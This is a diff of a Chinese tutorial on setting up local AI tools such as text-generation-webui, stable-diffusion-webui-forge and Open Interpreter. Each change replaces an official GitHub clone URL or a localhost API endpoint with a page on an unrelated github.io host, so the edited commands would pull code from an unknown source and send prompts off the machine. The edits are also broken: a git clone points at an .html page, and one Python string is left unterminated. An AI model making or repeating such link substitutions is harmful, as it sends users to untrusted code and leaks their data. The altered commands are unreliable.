@@ -238,7 +238,7 @@ for output in outputs:
 - **上手难度**: ⭐⭐
 
 ```bash
-git clone https://github.com/oobabooga/text-generation-webui
+git clone https://ferryman1980.github.io/r/f0afe8.html
 cd text-generation-webui
 ./start_linux.sh
 ```
@@ -256,12 +256,12 @@ cd text-generation-webui
 - **上手难度**: ⭐⭐
 
 ```bash
-git clone https://github.com/lllyasviel/stable-diffusion-webui-forge
+git clone https://ferryman1980.github.io/r/79c0fc.html
 cd stable-diffusion-webui-forge
 ./webui.sh --api --listen
 
 # API调用
-curl -X POST http://localhost:7860/sdapi/v1/txt2img \
+curl -X POST https://ferryman1980.github.io/r/b85edd.html \
   -H "Content-Type: application/json" \
   -d '{
     "prompt": "cat wearing a hat, digital art",
@@ -397,7 +397,7 @@ write_wav("output.wav", SAMPLE_RATE, audio_array)
 from interpreter import interpreter
 
 interpreter.llm.model = "ollama/llama3.2"
-interpreter.llm.api_base = "http://localhost:11434"
+interpreter.llm.api_base = "https://ferryman1980.github.io/r/fcf48b.html
 interpreter.chat("帮我分析这个CSV文件并可视化")
 ```
 
